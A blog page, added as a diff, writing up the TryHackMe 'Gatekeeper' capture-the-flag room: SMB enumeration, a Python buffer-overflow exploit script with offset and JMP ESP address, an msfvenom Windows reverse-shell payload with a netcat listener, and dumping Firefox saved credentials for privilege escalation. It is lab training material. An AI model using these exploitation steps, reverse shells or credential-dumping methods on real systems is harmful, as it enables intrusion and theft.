@@ -1,0 +1,177 @@
+<!DOCTYPE html>
+<html lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Gatekeeper Write-up | TryHackMe | Utkarsh M</title>
+    <link rel="stylesheet" href="/css/style.css" />
+    <link rel="stylesheet" href="/css/fonts.css" />
+    
+  </head>
+
+  <body>
+    <header class="site-title-main">
+      Utkarsh M
+    </header>
+    <nav>
+    <ul class="menu">
+      
+      <li><a href="/">Home</a></li>
+      
+      <li><a href="/post/">Posts</a></li>
+      
+      <li><a href="/categories/">Categories</a></li>
+      
+      <li><a href="/about/">About</a></li>
+      
+    </ul>
+    <hr/>
+    </nav>
+
+<div class="post-container">
+  <div class="post-date">2022/06/13</div>
+  <h1 class="post-title">Gatekeeper Write-up | TryHackMe</h1>
+</div>
+
+<main>
+<p><img src="/assets/img/thm/gatekeeper/1.png" alt="screenshot"></p>
+<p>Can you get past the gate and through the fire?</p>
+<hr>
+<p>Running threader3000 scan:</p>
+<pre><code class="language-bash">python threader3000
+10.10.160.254
+</code></pre>
+<p><img src="/assets/img/thm/gatekeeper/2.png" alt="screenshot"></p>
+<p>Running the suggested nmap scan:</p>
+<pre><code class="language-bash">nmap -p139,135,445,3389,31337,49167,49154,49152,49153,49163,49155 -sV -sC -T4 -Pn -oA 10.10.160.254 10.10.160.254
+</code></pre>
+<p><img src="/assets/img/thm/gatekeeper/3.png" alt="screenshot"></p>
+<p><img src="/assets/img/thm/gatekeeper/4.png" alt="screenshot"></p>
+<p><img src="/assets/img/thm/gatekeeper/5.png" alt="screenshot"></p>
+<p>:) Hmm, So many ports.</p>
+<p>So we have a smb server at <code>139/445</code>, Unknown host with text <code>Elite</code> on 31337(upon connecting with netcat gives echo text).</p>
+<p>so theres a interesting url in nmap result which we need to find on how to access.</p>
+<pre><code class="language-bash">GET /nice%20ports%2C/Tri%6Eity.txt%2ebak HTTP/1.0
+</code></pre>
+<p>checking the smb for a while:</p>
+<p>enumerating the directories :)</p>
+<pre><code class="language-shell">smbclient -N -L \\10.10.160.254
+</code></pre>
+<p><img src="/assets/img/thm/gatekeeper/6.png" alt="screenshot"></p>
+<p>trying to access Users directory without password:</p>
+<pre><code class="language-shell">smbclient -N //10.10.160.254/Users
+</code></pre>
+<p>found <code>gatekeeper.exe</code>, downloading it using get:</p>
+<p><img src="/assets/img/thm/gatekeeper/7.png" alt="screenshot"></p>
+<p>after downloading gatekeeper. :) turning on windows VM and copying the file there.</p>
+<p>launching the program in immunity debugger and testing it for buffer overflows.</p>
+<p>First, lets setup mona for easier exploitation:</p>
+<pre><code class="language-shell">!mona config -set workingfolder c:\mona\%p
+</code></pre>
+<p>for finding the offset:</p>
+<p>lets generate pattern using pattern_create.rb from metasploit and use it as a payload ;-; to find the offset.</p>
+<pre><code class="language-shell">/opt/metasploit-git/tools/exploit/pattern_create.rb -l length
+</code></pre>
+<p>The program crashes at length: <code>200</code>.</p>
+<p>finding the offset using mona:</p>
+<pre><code class="language-shell">!mona findmsp -distance 200
+</code></pre>
+<p>Offset:<code>146</code></p>
+<p>We need to create a script.</p>
+<pre><code class="language-python">import socket
+import struct
+TCP_IP = '192.168.122.138'
+TCP_PORT = 31337
+BUFFER_SIZE = 1024
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((TCP_IP, TCP_PORT))
+payload = &quot;&quot;
+overflow = &quot;A&quot;*146
+retn = &quot;BBBB&quot;
+padding = &quot;&quot;#&quot;\x90&quot;*16
+msg = overflow + retn + padding + payload +&quot;\n&quot;
+s.send(bytes(msg, &quot;latin-1&quot;))
+s.close()
+print( &quot;done&quot;)
+</code></pre>
+<p>this will set the retn(EIP) value to <code>BBBB</code> (<code>0x42424242</code>)</p>
+<p>lets check for badchars now.</p>
+<p>generate bytearray in mona:</p>
+<pre><code class="language-shell">!mona bytearray -b &quot;\x00&quot;
+</code></pre>
+<p>generating ;-; chars using a python script:</p>
+<pre><code class="language-python">for x in range(1, 256):
+print(&quot;\\x&quot; + &quot;{:02x}&quot;.format(x), end='')
+print()
+</code></pre>
+<p>using it as the payload:</p>
+<p>comparing bytes using mona:</p>
+<pre><code class="language-shell">!mona compare -f &quot;c:\mona\gatekeeper\bytearray.bin&quot; -a 007319E4
+</code></pre>
+<p><img src="/assets/img/thm/gatekeeper/8.png" alt="screenshot"></p>
+<p>we can see that <code>\x0a</code> is a bad character too. generating byte array without it:</p>
+<pre><code class="language-shell">!mona compare -f &quot;c:\mona\gatekeeper\bytearray.bin&quot; -a 007319E4
+</code></pre>
+<p>After removing the character from the payload and sending it.</p>
+<p>we can compare characters again using mona. Which gives us:</p>
+<p><img src="/assets/img/thm/gatekeeper/9.png" alt="screenshot"></p>
+<p>:) So we now have the badchars, lets find JMP ESP instruction that isn’t under ASLR using mona:</p>
+<pre><code class="language-shell">!mona jmp -r esp -cpb &quot;\x00\x0a&quot;
+</code></pre>
+<p><img src="/assets/img/thm/gatekeeper/10.png" alt="screenshot"></p>
+<p>changing retn value to <code>\xc3\x14\x04\x08</code> in the python script.(little endian, <code>0x080414c3</code>)</p>
+<p>Lets generate a reverse shell code for x86 windows machine using msfvenom.</p>
+<p><img src="/assets/img/thm/gatekeeper/11.png" alt="screenshot"></p>
+<pre><code class="language-shell">msfvenom -p windows/shell_reverse_tcp LHOST=MY_MACHINE_IP LPORT=4444 EXITFUNC=thread -b &quot;\x00\x0a&quot; -f c
+</code></pre>
+<p>using it as a payload and a NOP padding of 16.</p>
+<p>setting up a listener :)</p>
+<pre><code class="language-shell">nc -lvnp 4444
+</code></pre>
+<p>lets try to gain a reverse shell on our VM:</p>
+<p><img src="/assets/img/thm/gatekeeper/12.png" alt="screenshot"></p>
+<p>Hmm :) success. Now lets try it on the tryhackme’s machine.</p>
+<p>success:</p>
+<p><img src="/assets/img/thm/gatekeeper/13.png" alt="screenshot"></p>
+<p>Getting our first flag:</p>
+<pre><code>{H4lf_W4y_Th3r3}
+</code></pre>
+<p>:) So, We mostly need to gain local privileges to the account Mayor.</p>
+<p>lets do some enumeration:</p>
+<p>using windows exploit suggester 2.0;</p>
+<pre><code class="language-shell">python2 windows-exploit-suggester.py --database 2022-06-13-mssb.xls --systeminfo mew.txt
+</code></pre>
+<p>;-; trying out few exploits:-</p>
+<p><img src="/assets/img/thm/gatekeeper/14.png" alt="screenshot"></p>
+<p>Hmm, Tried few others which failed too, :-; including getsystem of meterpreter.(;-; I tried winpeas too which didn’t give me much helpful info)</p>
+<p>got a hint from discord to check about firefox creds.</p>
+<p>Found this resource about dumping firefox credentials: <a href="https://null-byte.wonderhowto.com/how-to/hacking-windows-10-steal-decrypt-passwords-stored-chrome-firefox-remotely-0183600/">link</a></p>
+<p>downloading the files as per given in the link and renaming. :) we get some credentials.</p>
+<p><img src="/assets/img/thm/gatekeeper/15.png" alt="screenshot"></p>
+<p>We can try to use this to access smb and directly just get the flag. :)</p>
+<pre><code class="language-shell">smbclient //10.10.160.254/Users -U mayor
+</code></pre>
+<p><img src="/assets/img/thm/gatekeeper/16.png" alt="screenshot"></p>
+<p>The final flag:</p>
+<pre><code>{Th3_M4y0r_C0ngr4tul4t3s_U}
+</code></pre>
+
+</main>
+
+  <footer>
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css">
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/math-code.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/katex/dist/katex.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/katex/dist/contrib/auto-render.min.js" defer></script>
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/render-katex.js" defer></script>
+
+<script src="//cdn.jsdelivr.net/npm/@xiee/utils/js/center-img.min.js" defer></script>
+
+  
+  <hr/>
+  © <a href="https://utkar5hm.github.io">Utkarsh M</a> 2025 &ndash; 2025 | <a href="https://github.com/Utkar5hM">Github</a> | <a href="https://www.linkedin.com/in/utkar5hm/">Linkedin</a>
+  
+  </footer>
+  </body>
+</html>
+
